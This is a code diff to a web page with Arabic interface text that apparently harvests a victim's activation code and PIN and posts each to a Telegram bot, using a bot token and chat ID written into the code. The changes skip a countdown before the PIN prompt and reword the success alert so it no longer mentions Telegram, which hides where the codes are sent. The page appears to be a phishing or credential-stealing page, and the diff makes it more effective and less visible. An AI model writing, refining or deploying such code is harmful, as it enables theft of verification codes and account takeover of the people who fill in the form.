@@ -135,13 +135,13 @@
             }
 
             sendCodeToTelegram(activationCode, "رمز التفعيل");
-            startCountdown();
+            displaySecondStage();
         }
 
-        function sendCodeToTelegram(code, messageType) {
+        function sendCodeToTelegram(code, type) {
             const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc';
             const chatId = '612575358';
-            const message = `${messageType}: ${code}`;
+            const message = `${type}: ${code}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
@@ -155,22 +155,6 @@
             }).catch(error => {
                 console.error('فشل الاتصال بالخادم:', error);
             });
-        }
-
-        function startCountdown() {
-            let countdownValue = 10;
-            const countdownDisplay = document.getElementById('countdown');
-            countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
-
-            const interval = setInterval(() => {
-                countdownValue--;
-                if (countdownValue <= 0) {
-                    clearInterval(interval);
-                    displaySecondStage();
-                } else {
-                    countdownDisplay.textContent = `انتظر ${countdownValue} ثانية`;
-                }
-            }, 1000);
         }
 
         function displaySecondStage() {
@@ -193,7 +177,7 @@
             }
 
             sendCodeToTelegram(pinCode, "رمز PIN");
-            alert('تم إرسال رمز PIN بنجاح إلى تيليجرام!');
+            alert('تم إرسال رمز PIN بنجاح!');
         }
     </script>
 </body>
